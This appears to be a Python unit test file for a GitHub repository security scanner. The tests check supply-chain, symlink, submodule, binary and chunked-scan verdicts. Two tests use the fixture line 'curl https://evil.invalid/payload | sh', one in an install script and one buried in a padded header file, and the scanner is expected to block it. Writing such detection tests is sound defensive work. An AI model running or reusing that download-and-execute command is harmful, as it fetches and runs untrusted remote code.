from __future__ import annotations

import base64
import tempfile
import unittest
from pathlib import Path
from typing import Any

from researcher.github_api import GitHubResponse
from researcher.rate_limit import RateLimitManager
from researcher.security_admission import GitHubFullTreeSecurityScanner
from researcher.security_gate import SecurityVerdict
from researcher.state import SQLiteStateStore
from researcher.supply_chain import SupplyChainVerdict

from helpers import candidate


class FakeGitHubApi:
    def __init__(self, responses: dict[str, Any]) -> None:
        self.responses = responses
        self.calls: list[str] = []

    def get(self, path: str) -> GitHubResponse:
        self.calls.append(path)
        if path not in self.responses:
            raise AssertionError(f"Unexpected GitHub API path: {path}")
        return GitHubResponse(
            data=self.responses[path],
            headers={
                "X-RateLimit-Remaining": "4999",
                "X-RateLimit-Reset": "9999999999",
            },
        )


def _blob(content: str) -> dict[str, str]:
    encoded = base64.b64encode(content.encode("utf-8")).decode("ascii")
    return {"encoding": "base64", "content": encoded}


class FullTreeSecurityAdmissionTests(unittest.TestCase):
    def _scan(
        self,
        *,
        source_path: str = "package.json",
        source_content: str = '{"dependencies":{"safe-package":"^1.2.3"}}',
        source_mode: str = "100644",
        extra_entries: list[dict[str, Any]] | None = None,
        extra_blob_contents: dict[str, str] | None = None,
        truncated: bool = False,
        expected_tree: str | None = None,
        scanner_kwargs: dict[str, Any] | None = None,
    ):
        item = candidate("secure-candidate", "a" * 40)
        tree_sha = "b" * 40
        if expected_tree is not None:
            item.extra["provenance_tree_sha"] = expected_tree
        blob_sha = "c" * 40
        entries: list[dict[str, Any]] = [
            {
                "path": source_path,
                "mode": source_mode,
                "type": "blob",
                "sha": blob_sha,
                "size": len(source_content.encode("utf-8")),
            }
        ]
        if extra_entries:
            entries.extend(extra_entries)
        responses: dict[str, Any] = {
            f"/repos/example/secure-candidate/commits/{'a' * 40}": {
                "sha": "a" * 40,
                "commit": {"tree": {"sha": tree_sha}},
            },
            f"/repos/example/secure-candidate/git/trees/{tree_sha}?recursive=1": {
                "tree": entries,
                "truncated": truncated,
            },
            f"/repos/example/secure-candidate/git/blobs/{blob_sha}": _blob(source_content),
        }
        for sha, content in (extra_blob_contents or {}).items():
            responses[f"/repos/example/secure-candidate/git/blobs/{sha}"] = _blob(content)
        with tempfile.TemporaryDirectory() as tmp:
            state = SQLiteStateStore(Path(tmp) / "state.db")
            api = FakeGitHubApi(responses)
            scanner = GitHubFullTreeSecurityScanner(
                api,  # type: ignore[arg-type]
                RateLimitManager(state),
                **(scanner_kwargs or {}),
            )
            report = scanner.scan(item)
        return report, api.calls

    def test_clean_complete_tree_is_admission_eligible(self) -> None:
        report, calls = self._scan()
        self.assertEqual(report.verdict, SecurityVerdict.CLEAR)
        self.assertTrue(report.complete)
        self.assertTrue(report.admission_eligible)
        self.assertIsNotNone(report.supply_chain)
        assert report.supply_chain is not None
        self.assertEqual(report.supply_chain.verdict, SupplyChainVerdict.CLEAR)
        self.assertEqual(report.scanned_files, 1)
        self.assertFalse(report.executed_untrusted_code)
        self.assertEqual(len(calls), 3)

    def test_supply_chain_review_prevents_admission(self) -> None:
        report, _ = self._scan(
            source_content=(
                '{"dependencies":{"unsafe":"git+https://example.invalid/u.git#main"}}'
            )
        )
        self.assertEqual(report.verdict, SecurityVerdict.REVIEW)
        self.assertFalse(report.admission_eligible)
        self.assertIsNotNone(report.supply_chain)
        assert report.supply_chain is not None
        self.assertEqual(report.supply_chain.verdict, SupplyChainVerdict.REVIEW)

    def test_download_and_execute_script_is_blocked(self) -> None:
        report, _ = self._scan(
            source_path="install.sh",
            source_content="curl https://evil.invalid/payload | sh",
            source_mode="100755",
        )
        self.assertEqual(report.verdict, SecurityVerdict.BLOCK)
        self.assertFalse(report.admission_eligible)
        self.assertIn(
            "shell_download_execute",
            {item.rule_id for item in report.findings},
        )

    def test_truncated_tree_requires_review(self) -> None:
        report, _ = self._scan(truncated=True)
        self.assertEqual(report.verdict, SecurityVerdict.REVIEW)
        self.assertFalse(report.complete)
        self.assertIn("tree_truncated", {item.rule_id for item in report.findings})

    def test_precompiled_binary_requires_review_without_execution(self) -> None:
        binary_sha = "d" * 40
        report, calls = self._scan(
            extra_entries=[
                {
                    "path": "android/libs/vendor.so",
                    "mode": "100644",
                    "type": "blob",
                    "sha": binary_sha,
                    "size": 4096,
                }
            ]
        )
        self.assertEqual(report.verdict, SecurityVerdict.REVIEW)
        self.assertFalse(report.complete)
        self.assertIn("android/libs/vendor.so", report.opaque_artifacts)
        self.assertFalse(any(binary_sha in call for call in calls))

    def test_submodule_requires_review(self) -> None:
        report, _ = self._scan(
            extra_entries=[
                {
                    "path": "third_party/native",
                    "mode": "160000",
                    "type": "commit",
                    "sha": "e" * 40,
                }
            ]
        )
        self.assertEqual(report.verdict, SecurityVerdict.REVIEW)
        self.assertFalse(report.complete)
        self.assertIn("third_party/native", report.submodules)

    def test_tree_provenance_mismatch_blocks_candidate(self) -> None:
        report, _ = self._scan(expected_tree="f" * 40)
        self.assertEqual(report.verdict, SecurityVerdict.BLOCK)
        self.assertFalse(report.admission_eligible)
        self.assertIn(
            "tree_provenance_mismatch",
            {item.rule_id for item in report.findings},
        )

    def test_safe_internal_symlink_resolves_to_scanned_source(self) -> None:
        link_sha = "d" * 40
        target_sha = "e" * 40
        target_content = "void capture() {}\n"
        report, calls = self._scan(
            extra_entries=[
                {
                    "path": "ios/Audio.swift",
                    "mode": "120000",
                    "type": "blob",
                    "sha": link_sha,
                    "size": len("../shared/Audio.swift"),
                },
                {
                    "path": "shared/Audio.swift",
                    "mode": "100644",
                    "type": "blob",
                    "sha": target_sha,
                    "size": len(target_content),
                },
            ],
            extra_blob_contents={
                link_sha: "../shared/Audio.swift",
                target_sha: target_content,
            },
        )
        self.assertEqual(report.verdict, SecurityVerdict.CLEAR)
        self.assertTrue(report.complete)
        self.assertIn("ios/Audio.swift", report.symlinks)
        self.assertNotIn(
            "unsafe_or_unresolved_symlink",
            {item.rule_id for item in report.findings},
        )
        self.assertTrue(any(target_sha in call for call in calls))

    def test_symlink_escape_remains_fail_closed(self) -> None:
        link_sha = "d" * 40
        report, _ = self._scan(
            extra_entries=[
                {
                    "path": "ios/Audio.swift",
                    "mode": "120000",
                    "type": "blob",
                    "sha": link_sha,
                    "size": len("../../outside.swift"),
                }
            ],
            extra_blob_contents={link_sha: "../../outside.swift"},
        )
        self.assertEqual(report.verdict, SecurityVerdict.REVIEW)
        self.assertFalse(report.complete)
        self.assertIn(
            "unsafe_or_unresolved_symlink",
            {item.rule_id for item in report.findings},
        )

    def test_missing_symlink_target_remains_fail_closed(self) -> None:
        link_sha = "d" * 40
        report, _ = self._scan(
            extra_entries=[
                {
                    "path": "ios/Audio.swift",
                    "mode": "120000",
                    "type": "blob",
                    "sha": link_sha,
                    "size": len("../shared/missing.swift"),
                }
            ],
            extra_blob_contents={link_sha: "../shared/missing.swift"},
        )
        self.assertEqual(report.verdict, SecurityVerdict.REVIEW)
        self.assertFalse(report.complete)

    def test_bounded_large_text_source_is_scanned_in_chunks(self) -> None:
        large_sha = "d" * 40
        large_content = "int sample = 0;\n" * 200
        report, calls = self._scan(
            extra_entries=[
                {
                    "path": "src/vendor.h",
                    "mode": "100644",
                    "type": "blob",
                    "sha": large_sha,
                    "size": len(large_content.encode("utf-8")),
                }
            ],
            extra_blob_contents={large_sha: large_content},
            scanner_kwargs={
                "max_blob_bytes": 1024,
                "max_large_text_bytes": 8192,
                "max_total_bytes": 16384,
            },
        )
        self.assertEqual(report.verdict, SecurityVerdict.CLEAR)
        self.assertTrue(report.complete)
        self.assertEqual(report.scanned_files, 2)
        self.assertTrue(any(large_sha in call for call in calls))
        self.assertNotIn(
            "source_blob_too_large",
            {item.rule_id for item in report.findings},
        )

    def test_malicious_pattern_crossing_large_text_chunk_is_detected(self) -> None:
        large_sha = "d" * 40
        prefix = "x" * 1000
        malicious = "curl https://evil.invalid/payload | sh"
        large_content = prefix + malicious + "\n" + ("y" * 1400)
        report, _ = self._scan(
            extra_entries=[
                {
                    "path": "src/vendor.h",
                    "mode": "100644",
                    "type": "blob",
                    "sha": large_sha,
                    "size": len(large_content),
                }
            ],
            extra_blob_contents={large_sha: large_content},
            scanner_kwargs={
                "max_blob_bytes": 1024,
                "max_large_text_bytes": 8192,
                "max_total_bytes": 16384,
                "static_chunk_overlap": 512,
            },
        )
        self.assertEqual(report.verdict, SecurityVerdict.BLOCK)
        self.assertIn(
            "shell_download_execute",
            {item.rule_id for item in report.findings},
        )

    def test_large_text_hard_cap_remains_fail_closed(self) -> None:
        large_sha = "d" * 40
        large_content = "a" * 5000
        report, calls = self._scan(
            extra_entries=[
                {
                    "path": "src/vendor.h",
                    "mode": "100644",
                    "type": "blob",
                    "sha": large_sha,
                    "size": len(large_content),
                }
            ],
            extra_blob_contents={large_sha: large_content},
            scanner_kwargs={
                "max_blob_bytes": 1024,
                "max_large_text_bytes": 4096,
                "max_total_bytes": 16384,
            },
        )
        self.assertEqual(report.verdict, SecurityVerdict.REVIEW)
        self.assertFalse(report.complete)
        self.assertIn(
            "source_blob_too_large",
            {item.rule_id for item in report.findings},
        )
        self.assertFalse(any(large_sha in call for call in calls))


if __name__ == "__main__":
    unittest.main()
